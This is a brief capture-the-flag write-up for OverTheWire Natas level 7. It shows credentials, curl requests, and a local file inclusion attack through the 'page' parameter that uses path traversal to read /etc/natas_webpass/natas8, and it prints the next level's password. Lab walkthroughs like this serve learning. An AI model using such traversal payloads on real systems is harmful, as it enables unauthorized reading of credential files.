# natas level7
natas is CTF with web application.

## using credential is below.
- User:natas7
- Pass:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

## using tools.
- shell(curl, base64, etc)
- lynx
check web site by lynx.
`lynx http://natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9@natas7.natas.labs.overthewire.org`

followings is message of this page.
~~~
Home About
~~~

If we access to link of Home, return same page and message is "this is the front page".
If we access to link of About, almost same as Home but message is "about page".
Any other informations are not exist in this page.

I check web page source of these(top, home, front), and I found hint.
`curl http://natas7.natas.labs.overthewire.org -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

hint: "password for webuser natas8 is in /etc/natas_webpass/natas8"
And if we access to home or about page, we use page parameter(ex page=about).
I guess, this page has directory traversal vulnerability at this parameter(page).

I test this, and it has vulnerability of local file inclusion.
~~~
curl 'http://natas7.natas.labs.overthewire.org/index.php?page=../' -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
include(): Failed opening '../' for inclusion (include_path='.:/usr/share/php:/usr/share/pear')
~~~

I access to natas webpass file, and got password.

`curl 'http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8' -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 
